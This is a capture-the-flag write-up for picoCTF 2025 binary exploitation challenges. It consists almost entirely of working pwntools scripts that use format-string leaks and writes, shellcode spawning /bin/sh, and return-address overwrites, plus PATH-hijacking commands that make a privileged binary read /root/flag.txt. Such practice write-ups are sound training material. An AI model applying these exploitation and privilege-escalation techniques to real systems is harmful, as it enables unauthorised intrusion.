# Write-Up-Pico-Pwn
# PICO CTF 2025 

## PWN
<details>
   <summary> PIE TIME </summary>

        #!/usr/bin/python3

        from pwn import *
        import argparse
        from time import *


        parser = argparse.ArgumentParser(description='Exploit script')
        parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
        args = parser.parse_args()

        exe = ELF('./vuln', checksec=False)
        #libc = ELF('./libc.so.6', checksec=False)
        #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
        #libc = exe.libc

        context.binary = exe
        context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

        info = lambda msg: log.info(msg)
        sla = lambda msg, data: p.sendlineafter(msg, data)
        sa = lambda msg, data: p.sendafter(msg, data)
        sl = lambda data: p.sendline(data)
        s = lambda data: p.send(data)
        sln = lambda msg, num: sla(msg, str(num).encode())
        sn = lambda msg, num: sa(msg, str(num).encode())

        def GDB():
            if args.remote is None:
                gdb.attach(p, gdbscript='''
                b* main+139

                c
                ''')
                input()

        if args.remote:
            p = remote('rescued-float.picoctf.net',64223)  
        else:
            p = process(exe.path)  

        #GDB()



        p.recvuntil(b' main: ')

        main = int(p.recvline().strip(),16)
        print(hex(main))
        exe.address = main - 0x133d
        print(hex(exe.address))

        sl(hex(exe.address + 0x00000000000012A7)) #win

        p.interactive()
</details>

<details>
    <summary> PIE TIME 2 </summary>
            
            #!/usr/bin/python3

            from pwn import *
            import argparse
            from time import *

            parser = argparse.ArgumentParser(description='Exploit script')
            parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
            args = parser.parse_args()

            exe = ELF('./vuln', checksec=False)
            #libc = ELF('./libc.so.6', checksec=False)
            #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
            #libc = exe.libc

            context.binary = exe
            context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

            info = lambda msg: log.info(msg)
            sla = lambda msg, data: p.sendlineafter(msg, data)
            sa = lambda msg, data: p.sendafter(msg, data)
            sl = lambda data: p.sendline(data)
            s = lambda data: p.send(data)
            sln = lambda msg, num: sla(msg, str(num).encode())
            sn = lambda msg, num: sa(msg, str(num).encode())

            def GDB():
                if args.remote is None:
                    gdb.attach(p, gdbscript='''
                    b* call_functions+80

                    c
                    ''')
                    input()

            if args.remote:
                p = remote('rescued-float.picoctf.net',55139)  
            else:
                p = process(exe.path)  

            #GDB()

            sl(b'%19$p')

            p.recvuntil(b'name:')

            leak = int(p.recvline().strip(),16)

            exe.address = leak - 0x1441

            win = exe.address + 0x000000000000136A

            sl(hex(win))

            p.interactive()
</details>

<details>
    <summary> Handoff </summary>
            
            #!/usr/bin/python3

            from pwn import *
            import argparse
            from time import *


            parser = argparse.ArgumentParser(description='Exploit script')
            parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
            args = parser.parse_args()

            exe = ELF('./handoff', checksec=False)
            #libc = ELF('./libc.so.6', checksec=False)
            #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
            #libc = exe.libc

            context.binary = exe
            context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

            info = lambda msg: log.info(msg)
            sla = lambda msg, data: p.sendlineafter(msg, data)
            sa = lambda msg, data: p.sendafter(msg, data)
            sl = lambda data: p.sendline(data)
            s = lambda data: p.send(data)
            sln = lambda msg, num: sla(msg, str(num).encode())
            sn = lambda msg, num: sa(msg, str(num).encode())

            def GDB():
                if args.remote is None:
                    gdb.attach(p, gdbscript='''
                    b* 0x00000000004013ED

                    c
                    ''')
                    input()

            if args.remote:
                p = remote('shape-facility.picoctf.net',60437)  
            else:
                p = process(exe.path)  

            #GDB()


            jmp_rax = 0x000000000040116c

            sl(b'3')

            shell = asm(
                '''
                xor rax,rax
                xor rdi,rdi
                mov rsi,rsi
                mov rsi,rsp         #excute read
                syscall
                jmp rsi
                ''',arch='amd64'
            )

            pl = flat(
                shell.ljust(20),
                jmp_rax,            

            )
            sl(pl)

            shell = asm(
                '''
                mov rbx, 29400045130965551
                push rbx

                mov rdi, rsp
                xor rsi, rsi
                xor rdx, rdx
                mov rax, 0x3b
                syscall
                ''',arch='amd64'
            )
            s(shell)

            p.interactive()
</details>

<details>
    <summary> Echo Valley </summary>

    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *


    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./valley', checksec=False)
    #libc = ELF('./libc.so.6', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc

    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* echo_valley+218

            c
            ''')
            input()

    if args.remote:
        p = remote('shape-facility.picoctf.net',49775)  
    else:
        p = process(exe.path)  

    #GDB()

    sl(b'%21$p-%20$p')

    p.recvuntil(b'distance: ')
    leak = int(p.recvuntil(b'-',drop=True),16)
    stack = int(p.recvline().strip(),16)

    exe.address = leak - 0x1413

    print('exe = ' + hex(exe.address))
    print('stack = ' + hex(stack))


    win = exe.address + 0x0000000000001269
    print('win '+ hex(win))
    ret = stack - 0x8
    print('ret ' + hex(ret))

    pl = flat(
        f'%{win & 0xffff}c%8$hn'.encode().ljust(0x10),  #Change main to PrintFlag
        ret,
    )
    sl(pl)

    sl(b'exit')

    p.interactive()

</details>

<details>
    <summary> Hash only 1 </summary>
    
        echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
        chmod +x md5sum
        mkdir /tmp/fakepath
        mv md5sum /tmp/fakepath/

        export PATH="/tmp/fakepath:$PATH"
        ./flaghasher

</details>

<details>
    <summary> Hash only 2 </summary>
    
        sh # Chạy shell sh
        
        echo -e '#!/bin/bash\ncat /root/flag.txt' > /tmp/md5sum
        chmod +x /tmp/md5sum
        export PATH="/tmp:$PATH"
        flaghasher 

</details>









